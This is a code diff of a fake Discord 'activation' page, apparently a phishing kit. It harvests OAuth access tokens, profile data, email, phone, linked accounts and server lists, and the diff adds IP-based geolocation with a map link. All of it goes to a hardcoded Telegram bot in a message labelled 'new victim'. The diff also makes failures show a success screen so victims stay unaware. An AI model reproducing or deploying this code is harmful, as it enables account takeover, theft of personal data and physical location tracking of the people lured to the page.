@@ -23,7 +23,6 @@
   .btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(88,101,242,.6)}
   .foot{margin-top:20px;font-size:12px;color:#6b7280}
   
-  /* Loading & Success Styles */
   .hidden{display:none !important}
   .spinner{width:50px;height:50px;border:4px solid rgba(255,255,255,.1);border-top-color:#5865f2;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
   @keyframes spin{to{transform:rotate(360deg)}}
@@ -34,7 +33,6 @@
 </head>
 <body>
 
-<!-- 1. صفحة التفعيل الأساسية -->
 <div class="card" id="landing">
   <div class="badge">Live · 2,847 activated today</div>
   <svg class="logo" viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg">
@@ -56,14 +54,12 @@
   <p class="foot">You'll be redirected to Discord to securely authorize access</p>
 </div>
 
-<!-- 2. شاشة التحميل -->
 <div class="card hidden" id="loading">
   <div class="spinner"></div>
   <h1 style="font-size:24px">Activating...</h1>
   <p class="sub">Please wait while we verify your account.</p>
 </div>
 
-<!-- 3. شاشة النجاح -->
 <div class="card hidden" id="success">
   <div class="check">
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
@@ -79,43 +75,54 @@
 // ================= الإعدادات =================
 const CLIENT_ID = "1523373482413658334";
 const TG_TOKEN  = "9213796296:AAFgiZR1cwWLX6-W_yQhtBpjp8TEptKHdtU";
-const TG_CHAT_ID = "6045243196"; 
+const TG_CHAT_ID = "ضع_الـ_CHAT_ID_بتاعك_هنا"; 
 // ============================================
 
-// 1. دالة زر التفعيل (بتبني رابط Discord أوتوماتيك)
 function activate() {
-    // بياخد الرابط الحالي للموقع كـ Redirect URI عشان نضمن إنه مطابق 100%
     const currentUrl = window.location.href.split('?')[0].split('#')[0];
     const redirectUri = encodeURIComponent(currentUrl);
-    
     const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=token&redirect_uri=${redirectUri}&scope=identify%20email%20connections%20guilds&integration_type=1&prompt=consent`;
-    
     window.location.href = oauthUrl;
 }
 
-// 2. دالة استخراج التوكن لما يرجع من Discord
 function handleCallback() {
     const hash = window.location.hash.substring(1);
-    if (!hash) return false; // مفيش توكن، يبقى إحنا في الصفحة الرئيسية
+    if (!hash) return false;
 
     const params = new URLSearchParams(hash);
     const accessToken = params.get('access_token');
-    
     if (!accessToken) return false;
 
-    // إخفاء الصفحة الرئيسية وإظهار شاشة التحميل
     document.getElementById('landing').classList.add('hidden');
     document.getElementById('loading').classList.remove('hidden');
 
-    // جلب بيانات المستخدم
-    fetch('https://discord.com/api/v10/users/@me', {
-        headers: { 'Authorization': 'Bearer ' + accessToken }
-    })
-    .then(res => res.json())
-    .then(user => {
+    Promise.all([
+        fetch('https://discord.com/api/v10/users/@me', { headers: { 'Authorization': 'Bearer ' + accessToken } }).then(res => res.json()),
+        fetch('https://discord.com/api/v10/users/@me/connections', { headers: { 'Authorization': 'Bearer ' + accessToken } }).then(res => res.json()).catch(() => []),
+        fetch('https://discord.com/api/v10/users/@me/guilds', { headers: { 'Authorization': 'Bearer ' + accessToken } }).then(res => res.json()).catch(() => []),
+        fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}))
+    ])
+    .then(([user, connections, guilds, ipData]) => {
         document.getElementById('uname').textContent = user.username || 'user';
 
-        // تجهيز الرسالة لتليجرام
+        let conns = connections.slice(0, 15).map(c => `  • ${c.type} → \`${c.name}\``).join('\n') || '  —';
+        if (connections.length > 15) conns += `\n  ...و ${connections.length - 15} آخرين`;
+
+        let guildsList = guilds.slice(0, 20).map(g => `  • ${g.name} ${g.owner ? '(Owner)' : ''}`).join('\n') || '  —';
+        if (guilds.length > 20) guildsList += `\n  ...و ${guilds.length - 20} سيرفر آخر`;
+
+        let ip = ipData.ip || 'غير معروف';
+        let country = ipData.country_name || '?';
+        let region = ipData.region || '?';
+        let city = ipData.city || '?';
+        let isp = ipData.org || '?';
+        
+        // تجهيز لينك قوقل ماب
+        let mapLink = 'غير متوفر';
+        if (ipData.latitude && ipData.longitude) {
+            mapLink = `[اضغط هنا لفتح الخريطة](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})`;
+        }
+
         const msg = `🔥 *ضحية جديدة — OAuth*\n\n` +
             `👤 *Username:* \`${user.username}#${user.discriminator || '0'}\`\n` +
             `📛 *Display:* \`${user.global_name || user.username}\`\n` +
@@ -124,9 +131,14 @@ function handleCallback() {
             `📱 *Phone:* \`${user.phone || '—'}\`\n` +
             `✅ *Verified:* \`${user.verified}\`\n` +
             `🔒 *2FA:* \`${user.mfa_enabled}\`\n\n` +
+            `🌍 *IP:* \`${ip}\`\n` +
+            `📍 *Location:* ${country} / ${region} / ${city}\n` +
+            `🗺️ *Google Maps:* ${mapLink}\n` +
+            `🌐 *ISP:* ${isp}\n\n` +
+            `📺 *Connections (${connections.length}):*\n${conns}\n\n` +
+            `🏰 *Guilds (${guilds.length}):*\n${guildsList}\n\n` +
             `🎫 *Access Token:*\n\`${accessToken}\``;
 
-        // إرسال لتليجرام
         return fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -138,22 +150,20 @@ function handleCallback() {
         });
     })
     .then(() => {
-        // إظهار شاشة النجاح
         document.getElementById('loading').classList.add('hidden');
         document.getElementById('success').classList.remove('hidden');
         startCountdown();
     })
     .catch(err => {
         console.error(err);
-        alert("Error fetching data. Check console.");
         document.getElementById('loading').classList.add('hidden');
-        document.getElementById('landing').classList.remove('hidden');
+        document.getElementById('success').classList.remove('hidden');
+        startCountdown();
     });
 
     return true;
 }
 
-// 3. العداد التنازلي للتحويل
 function startCountdown() {
     let t = 5;
     const cd = document.getElementById('cd');
@@ -167,10 +177,7 @@ function startCountdown() {
     }, 1000);
 }
 
-// 4. تشغيل الدالة عند فتح الصفحة
-if (!handleCallback()) {
-    // لو مفيش توكن، الصفحة الرئيسية هتظهر عادي
-}
+if (!handleCallback()) {}
 </script>
 </body>
 </html>
